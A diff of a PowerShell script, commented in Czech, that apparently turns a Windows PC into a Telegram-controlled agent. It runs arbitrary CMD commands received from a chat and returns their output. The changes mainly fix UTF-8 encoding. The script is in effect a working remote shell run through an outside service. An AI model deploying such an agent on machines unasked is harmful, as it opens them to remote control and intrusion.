@@ -5,7 +5,7 @@ $chatId = $null
 
 function Write-Log($msg) {
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "$timestamp - $msg" | Out-File -FilePath $logFile -Append
+    "$timestamp - $msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
     Write-Host $msg
 }
 
@@ -14,7 +14,7 @@ Write-Log "=== AGENT START ==="
 # Načti uložený stav (pokud existuje)
 if(Test-Path $stateFile) {
     try {
-        $savedState = Get-Content $stateFile -Raw | ConvertFrom-Json
+        $savedState = Get-Content $stateFile -Raw -Encoding UTF8 | ConvertFrom-Json
         $lastUpdateId = $savedState.lastUpdateId
         $chatId = $savedState.chatId
         Write-Log "Obnovuji stav: updateId=$lastUpdateId, chatId=$chatId"
@@ -23,7 +23,6 @@ if(Test-Path $stateFile) {
         $lastUpdateId = 0
     }
 } else {
-    # Při prvním spuštění přeskoč staré zprávy
     Write-Log "Prvni spusteni - preskakuji stare zpravy"
     try {
         $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates?timeout=1" -Method Get -TimeoutSec 5
@@ -46,7 +45,7 @@ function Save-State {
             lastUpdateId = $lastUpdateId
             chatId = $chatId
         } | ConvertTo-Json
-        $state | Out-File -FilePath $stateFile -Force
+        $state | Out-File -FilePath $stateFile -Force -Encoding UTF8
         Write-Log "Stav ulozen: updateId=$lastUpdateId"
     } catch {
         Write-Log "ERROR pri ukladani stavu: $_"
@@ -61,11 +60,16 @@ function Send-Message($text) {
     
     Write-Log "Odesilam zpravu do chatId=$chatId"
     
-    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
+    # Ujisti se že je text v UTF-8 a escape JSON znaky
+    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",'' -replace "`t",'\t'
+    
+    # Odstranit problematické non-UTF-8 znaky
+    $text = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($text))
+    
     $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
     
     try {
-        $result = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json' -Body $json -ErrorAction Stop
+        $result = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json; charset=utf-8' -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ErrorAction Stop
         Write-Log "Zprava odeslana OK"
     } catch {
         Write-Log "ERROR pri odesilani zpravy: $_"
@@ -124,7 +128,7 @@ while($true) {
                 Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/log - Zobraz log`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
             } elseif($cmd -eq '/log') {
                 if(Test-Path $logFile) {
-                    $logContent = Get-Content $logFile -Tail 30 -Raw
+                    $logContent = Get-Content $logFile -Encoding UTF8 | Select-Object -Last 30 | Out-String
                     if($logContent.Length -gt 3500) {
                         $logContent = $logContent.Substring($logContent.Length - 3500)
                     }
@@ -143,9 +147,14 @@ while($true) {
                 Write-Log "Vykonavani prikazu: $cmd"
                 Send-Message "[EXECUTING] $cmd"
                 try {
-                    $output = cmd /c "$cmd" 2>&1
+                    # Nastav CMD na UTF-8 kódování před spuštěním příkazu
+                    $output = cmd /c "chcp 65001 >nul 2>&1 & $cmd" 2>&1
                     $exitCode = $LASTEXITCODE
                     Write-Log "Prikaz dokoncen s exit code: $exitCode"
+                    
+                    # Konvertuj do UTF-8 a odstranit BOM
+                    $output = $output | Out-String
+                    $output = $output.Trim()
                     
                     if($output) {
                         $result = "[EXIT: $exitCode]`n`n$output"
